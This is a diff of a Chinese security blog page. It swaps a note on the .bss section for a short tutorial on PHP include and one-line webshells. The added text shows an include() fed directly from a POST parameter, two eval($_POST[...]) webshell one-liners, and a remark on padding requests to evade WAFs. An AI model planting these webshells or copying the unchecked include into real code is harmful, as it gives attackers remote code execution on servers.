@@ -19,17 +19,17 @@
   <meta name="author" content="fogpost">
   <meta name="keywords" content="">
   
-    <meta name="description" content=".bss节区.bss节区简介bss节区是程序中未初始化的全局变量和静态变量所在的节区，它通常在程序开始执行前被初始化为0。bss节区的大小由程序中未初始化的全局变量和静态变量的数量和大小决定。 .bss节区的特点可以用于反dump">
+    <meta name="description" content="了解一下php的include函数顺便了解一句话木马的各种形式 include函数在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。 1234&lt;?phpinclude &#x27;test.php&#x27;;echo &#x27;hello world&#x27;;?&gt; 如果test.php不存在，则会抛出一个警告，但程序会继续">
 <meta property="og:type" content="article">
-<meta property="og:title" content="wuai第八课">
-<meta property="og:url" content="https://fogpost.top/2024/10/15/wuai%E7%AC%AC%E5%85%AB%E8%AF%BE/index.html">
+<meta property="og:title" content="php一句话木马">
+<meta property="og:url" content="https://fogpost.top/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
 <meta property="og:site_name" content="fogpost&#96;s little blog">
-<meta property="og:description" content=".bss节区.bss节区简介bss节区是程序中未初始化的全局变量和静态变量所在的节区，它通常在程序开始执行前被初始化为0。bss节区的大小由程序中未初始化的全局变量和静态变量的数量和大小决定。 .bss节区的特点可以用于反dump">
+<meta property="og:description" content="了解一下php的include函数顺便了解一句话木马的各种形式 include函数在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。 1234&lt;?phpinclude &#x27;test.php&#x27;;echo &#x27;hello world&#x27;;?&gt; 如果test.php不存在，则会抛出一个警告，但程序会继续">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-10-15T15:06:10.000Z">
-<meta property="article:modified_time" content="2024-10-28T13:29:54.523Z">
+<meta property="article:published_time" content="2024-10-09T02:52:03.000Z">
+<meta property="article:modified_time" content="2024-10-30T06:51:21.728Z">
 <meta property="article:author" content="fogpost">
-<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="php">
 <meta name="twitter:card" content="summary_large_image">
   
   
@@ -37,7 +37,7 @@
     <!-- <meta name="referrer" content="no-referrer" /> -->
   
   
-  <title>wuai第八课 - fogpost`s little blog</title>
+  <title>php一句话木马 - fogpost`s little blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="wuai第八课"></span>
+            <span id="subtitle" data-typed-text="php一句话木马"></span>
           
         </div>
 
@@ -226,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-15 23:06" pubdate>
-          2024年10月15日 晚上
+        <time datetime="2024-10-09 10:52" pubdate>
+          2024年10月9日 上午
         </time>
       </span>
     
@@ -238,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          93 字
+          221 字
         
       </span>
     
@@ -249,7 +249,7 @@
         
         
         
-          1 分钟
+          2 分钟
         
       </span>
     
@@ -295,12 +295,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">wuai第八课</h1>
+            <h1 id="seo-header">php一句话木马</h1>
             
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2024-10-28T21:29:54+08:00
+                    本文最后更新于 2024-10-30T14:51:21+08:00
                   
                   
 
@@ -310,8 +310,16 @@
             
               <div class="markdown-body">
                 
-                <h1 id="bss节区"><a href="#bss节区" class="headerlink" title=".bss节区"></a>.bss节区</h1><h2 id="bss节区简介"><a href="#bss节区简介" class="headerlink" title=".bss节区简介"></a>.bss节区简介</h2><p>bss节区是程序中未初始化的全局变量和静态变量所在的节区，它通常在程序开始执行前被初始化为0。bss节区的大小由程序中未初始化的全局变量和静态变量的数量和大小决定。</p>
-<h2 id="bss节区的特点"><a href="#bss节区的特点" class="headerlink" title=".bss节区的特点"></a>.bss节区的特点</h2><p>可以用于反dump</p>
+                <p>了解一下php的include函数顺便了解一句话木马的各种形式</p>
+<h2 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a>include函数</h2><p>在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>如果test.php不存在，则会抛出一个警告，但程序会继续执行，输出hello world。<br>我们也可以在文件中定义动态的文件名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$NSS</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NSS&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$NSS</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<h2 id="木马举例"><a href="#木马举例" class="headerlink" title="木马举例"></a>木马举例</h2><blockquote>
+<?php @eval($_POST['cmd']); ?>
+<?php @eval($_POST[1]); ?><p>,简析一下这两马效果是一样的，但是数字与字符串的区别在于是否需要增加引号<br>一句话木马通常使用 POST 请求而不是 GET，因为 get传参有限制，在对某些waf进行垃圾数据填充时不方便，无法构造畸形的数据包</p>
+</blockquote>
 
                 
               </div>
@@ -330,7 +338,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E8%AF%BE%E7%A8%8B/" class="category-chain-item">课程</a>
+  <a href="/categories/%E7%BD%91%E7%BB%9C/" class="category-chain-item">网络</a>
   
   
 
@@ -345,7 +353,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/reverse/" class="print-no-link">#reverse</a>
+        <a href="/tags/php/" class="print-no-link">#php</a>
       
     </div>
   
@@ -357,8 +365,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>wuai第八课</div>
-      <div>https://fogpost.top/2024/10/15/wuai第八课/</div>
+      <div>php一句话木马</div>
+      <div>https://fogpost.top/2024/10/09/php一句话木马/</div>
     </div>
     <div class="license-meta">
       
@@ -370,7 +378,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年10月15日</div>
+          <div>2024年10月9日</div>
         </div>
       
       
@@ -402,9 +410,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/16/Hook/" title="Hook">
+                      <a href="/2024/10/15/wuai%E7%AC%AC%E5%85%AB%E8%AF%BE/" title="wuai第八课">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Hook</span>
+                        <span class="hidden-mobile">wuai第八课</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -412,8 +420,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" title="php一句话木马">
-                        <span class="hidden-mobile">php一句话木马</span>
+                      <a href="/2024/10/01/sql/" title="sql">
+                        <span class="hidden-mobile">sql</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
